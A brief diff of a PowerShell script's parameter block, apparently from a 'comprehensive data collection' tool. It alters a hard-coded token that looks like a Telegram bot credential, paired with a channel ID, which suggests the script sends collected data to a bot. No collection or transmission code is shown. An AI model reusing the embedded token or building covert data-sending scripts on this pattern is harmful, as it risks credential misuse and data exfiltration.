@@ -2,7 +2,7 @@
 # Comprehensive data collection with secure transmission
 
 param(
-    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFFJ2ZbhtJs",
+    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
     [string]$CommChannel = "2047893044"
 )
 
